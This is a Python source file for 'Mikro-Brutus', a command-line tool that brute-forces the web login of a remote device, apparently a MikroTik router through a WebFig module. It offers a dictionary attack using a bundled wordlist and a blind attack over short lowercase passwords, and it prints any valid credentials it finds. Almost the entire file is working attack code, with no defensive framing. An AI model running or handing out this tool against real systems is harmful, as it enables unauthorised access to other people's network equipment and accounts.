import sys
import argparse
import itertools
import string
import zipfile
import os
import contextlib
from webfig import WebFig
import colorama

colorama.init(autoreset=True)

def print_banner():
    banner = f"{colorama.Fore.CYAN}====================================\n"\
             f"           Mikro-Brutus Tool\n"\
             f"===================================="
    print(banner)

def extract_dictionary(zip_file="dictionary.zip"):
    zip_file_dir = os.path.dirname(zip_file)
    with zipfile.ZipFile(zip_file, "r") as zip_ref:
        zip_ref.extractall(zip_file_dir)

def clear_line():
    sys.stdout.write("\033[K")  # Clear the content of the line

def dictionary_attack(args):
    with open(args.dictionary) as passwords:
        for attempt, password in enumerate(passwords, start=1):
            password = password.strip()
            clear_line()
            print(
                f"\r{colorama.Fore.YELLOW}Attempt {attempt} - Trying username: {args.username}, password: {password}",
                end="",
            )
            with contextlib.suppress(ValueError):
                w = WebFig(args.rhost, args.rport, args.username, password)
                if w.is_valid_credential():
                    print(f"{colorama.Fore.GREEN}\nSuccess! Valid credentials:\n{args.username}:{password}")
                    return True
    return False

def blind_attack(args, max_password_length=4):
    for password_length in range(1, max_password_length + 1):
        for attempt, password in enumerate(
            itertools.product(string.ascii_lowercase, repeat=password_length), start=1
        ):
            password = "".join(password)
            clear_line()
            print(
                f"\r{colorama.Fore.YELLOW}Attempt {attempt} - Trying username: {args.username}, password: {password}",
                end="",
            )
            with contextlib.suppress(ValueError):
                w = WebFig(args.rhost, args.rport, args.username, password)
                if w.is_valid_credential():
                    print(f"{colorama.Fore.GREEN}\nSuccess! Valid credentials:\n{args.username}:{password}")
                    return True
    return False


def main():
    print_banner()
    parser = argparse.ArgumentParser(
        description="Perform a brute force attack using either dictionary or blind method."
    )
    parser.add_argument(
        "--rhost", required=True, help="The remote address to brute force."
    )
    parser.add_argument(
        "--rport",
        default=80,
        type=int,
        help="The remote port to brute force (default: 80).",
    )
    parser.add_argument(
        "--username", required=True, help="The username to authenticate with."
    )
    parser.add_argument(
        "--dictionary",
        default="rock",
        help="The dictionary file for dictionary attack or 'rock' for default.",
    )
    parser.add_argument(
        "--method",
        choices=["dictionary", "blind"],
        default="dictionary",
        help="The attack method: 'dictionary' or 'blind' (default: 'dictionary').",
    )
    args = parser.parse_args()

    success = False
    try:
        if args.method == "dictionary":
            if args.dictionary == "rock":
                extract_dictionary()
                args.dictionary = "dictionary.txt"
            success = dictionary_attack(args)
        elif args.method == "blind":
            success = blind_attack(args)
    except KeyboardInterrupt:
        print(f"{colorama.Fore.RED}\nOperation canceled by the user.")
    except Exception as e:
        print(f"{colorama.Fore.RED}An error occurred: {e}")

    if not success:
        print(f"{colorama.Fore.RED}\nAttack completed. No successful credentials found.")



if __name__ == "__main__":
    main()
